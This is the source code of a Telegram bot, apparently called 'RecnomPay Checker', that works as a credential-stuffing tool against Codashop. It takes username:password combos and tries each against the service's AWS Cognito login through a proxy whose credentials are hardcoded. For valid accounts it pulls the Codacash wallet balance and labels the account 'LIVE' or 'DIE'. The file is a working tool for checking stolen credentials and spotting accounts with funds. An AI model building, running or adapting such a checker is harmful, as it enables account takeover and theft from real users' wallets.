const { Telegraf } = require('telegraf');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

// Inisialisasi Bot
const bot = new Telegraf(process.env.BOT_TOKEN);

// Proxy dari skrip PHP kamu
const proxyAgent = new HttpsProxyAgent('http://8998c0d8430265a3c9ab:6b2739b4b177724e@gw.dataimpulse.com:823');

bot.start((ctx) => {
  ctx.reply('Halo! Selamat datang di RecnomPay Checker.\n\nGunakan format:\n/codashop username:password');
});

bot.command('codashop', async (ctx) => {
  const messageText = ctx.message.text;
  const args = messageText.split(' ');

  // Cek apakah ada input combo
  if (args.length < 2) {
    return ctx.reply('❌ Format Salah!\nGunakan: /codashop username:password');
  }

  // Bersihkan format (menangani separator | ; atau spasi seperti di PHP)
  const combo = args[1];
  const parts = combo.replace(/[|;\s]/g, ':').split(':');

  if (parts.length < 2) {
    return ctx.reply('❌ Format Salah!\nGunakan: /codashop username:password');
  }

  const username = parts[0].trim();
  const password = parts[1].trim();

  // Kirim pesan loading
  const loadingMsg = await ctx.reply('🔍 <i>RecnomPay System sedang memeriksa akun...</i>', { parse_mode: 'HTML' });

  try {
    // 1. Hit API AWS Cognito (Initiate Auth)
    const authPayload = {
      AuthFlow: "USER_PASSWORD_AUTH",
      ClientId: "437f3u0sfh7h0av5rlrrjdtmsb",
      AuthParameters: { USERNAME: username, PASSWORD: password },
      ClientMetadata: { country_code: "ph", lang_code: "en" }
    };

    const authRes = await axios.post("https://cognito-idp.ap-southeast-1.amazonaws.com/", authPayload, {
      headers: {
        "x-amz-target": "AWSCognitoIdentityProviderService.InitiateAuth",
        "Content-Type": "application/x-amz-json-1.1"
      },
      httpsAgent: proxyAgent,
      timeout: 20000 // 20 detik seperti CURLOPT_TIMEOUT
    });

    if (authRes.data && authRes.data.AuthenticationResult) {
      const idToken = authRes.data.AuthenticationResult.IdToken;

      // 2. Hit API Wallet Codacash untuk cek Balance
      const walletRes = await axios.get("https://wallet-api.codacash.com/user/wallet", {
        headers: {
          "Authorization": idToken,
          "x-country-code": "608"
        },
        httpsAgent: proxyAgent,
        timeout: 15000 // 15 detik seperti CURLOPT_TIMEOUT
      });

      // Ambil balance, jika null jadikan 0
      const balance = walletRes.data?.data?.balanceAmount || 0;

      // Edit pesan loading menjadi hasil LIVE
      await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined,
        `✅ <b>LIVE ACCOUNT</b>\n━━━━━━━━━━━━━━━━━━\nAcc: <code>${username}:${password}</code>\nBalance: <b>${balance}</b>\n━━━━━━━━━━━━━━━━━━\n🤖 <i>RecnomPay Checker</i>`,
        { parse_mode: 'HTML' }
      );
    } else {
       throw new Error("Invalid Credentials");
    }

  } catch (error) {
    // Menangkap pesan DIE atau Error API
    let errorMsg = 'Invalid Credentials / Timeout';
    
    // Mengekstrak tipe error dari AWS Cognito seperti di PHP
    if (error.response && error.response.data && error.response.data.__type) {
      errorMsg = error.response.data.__type.replace('Exception', '');
    }

    // Edit pesan loading menjadi hasil DIE
    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined,
      `❌ <b>DIE ACCOUNT</b>\n━━━━━━━━━━━━━━━━━━\nAcc: <code>${username}:${password}</code>\nMsg: ${errorMsg}\n━━━━━━━━━━━━━━━━━━`,
      { parse_mode: 'HTML' }
    );
  }
});

// Handler utama Vercel Serverless Function
module.exports = async (req, res) => {
  try {
    if (req.method === 'POST') {
      await bot.handleUpdate(req.body, res);
    } else {
      res.status(200).send('RecnomPay Bot berjalan dengan baik!');
    }
  } catch (error) {
    console.error(error);
    res.status(500).send('Terjadi kesalahan pada server');
  }
};
